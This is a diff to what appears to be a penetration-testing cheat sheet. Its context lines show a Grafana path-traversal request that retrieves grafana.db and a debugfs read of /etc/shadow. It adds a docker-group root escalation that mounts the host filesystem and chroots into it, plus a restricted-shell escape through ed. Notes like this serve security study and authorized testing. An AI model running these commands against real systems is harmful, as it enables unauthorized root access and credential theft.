@@ -649,7 +649,9 @@ Would you like to save the private key? (y/N)
 curl --path-as-is "http://192.168.202.181:3000/public/plugins/prometheus/../../../../../../../../../var/lib/grafana/grafana.db" --output grafana.db
 ```
 
-## disk group (linux)
+## Linux Group
+
+### disk group
 
 **uid=1001(user1) gid=1002(user1) groups=1002(user1), 6(disk)**
 
@@ -687,4 +689,34 @@ debugfs -R "cat /etc/shadow" /dev/sda2
 
 ```
 debugfs /dev/sda2 <- interactive mode
+```
+
+### docker group
+
+**uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)**
+
+- Check available images (when there is no internet conenction)
+
+```bash
+docker images
+```
+
+```
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+redmine             latest              0c8429c66e07        6 years ago         542MB
+postgres            latest              adf2b126dda8        6 years ago         313MB
+```
+
+```bash
+docker run -v /:/mnt --rm -it redmine chroot /mnt sh
+```
+
+## rbash
+
+- [rbash breaking](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/)
+
+```
+ed
+!'/bin/bash'
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
